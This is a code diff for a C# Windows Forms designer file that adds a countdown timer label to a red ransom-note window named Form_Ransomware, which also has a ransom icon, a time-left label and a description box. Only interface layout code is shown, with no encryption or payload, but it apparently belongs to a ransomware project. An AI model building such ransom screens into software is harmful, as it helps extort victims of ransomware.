@@ -35,6 +35,7 @@
             this.PB_Ransom_Icon = new System.Windows.Forms.PictureBox();
             this.Label_Time_Left = new System.Windows.Forms.Label();
             this.Label_date = new System.Windows.Forms.Label();
+            this.Label_timer = new System.Windows.Forms.Label();
             ((System.ComponentModel.ISupportInitialize)(this.PB_Ransom_Icon)).BeginInit();
             this.SuspendLayout();
             // 
@@ -109,12 +110,25 @@
             this.Label_date.Text = "4/4/2019 10:44:43 AM";
             this.Label_date.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
             // 
+            // Label_timer
+            // 
+            this.Label_timer.AutoSize = true;
+            this.Label_timer.Font = new System.Drawing.Font("Comic Sans MS", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.Label_timer.ForeColor = System.Drawing.Color.Yellow;
+            this.Label_timer.Location = new System.Drawing.Point(145, 655);
+            this.Label_timer.Name = "Label_timer";
+            this.Label_timer.Size = new System.Drawing.Size(200, 23);
+            this.Label_timer.TabIndex = 6;
+            this.Label_timer.Text = "4/4/2019 10:44:43 AM";
+            this.Label_timer.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
             // Form_Ransomware
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.Red;
             this.ClientSize = new System.Drawing.Size(1205, 718);
+            this.Controls.Add(this.Label_timer);
             this.Controls.Add(this.Label_date);
             this.Controls.Add(this.Label_Time_Left);
             this.Controls.Add(this.TB_Ransomeware_Description);
@@ -137,5 +151,6 @@
         private System.Windows.Forms.TextBox TB_Ransomeware_Description;
         private System.Windows.Forms.Label Label_Time_Left;
         private System.Windows.Forms.Label Label_date;
+        private System.Windows.Forms.Label Label_timer;
     }
 }
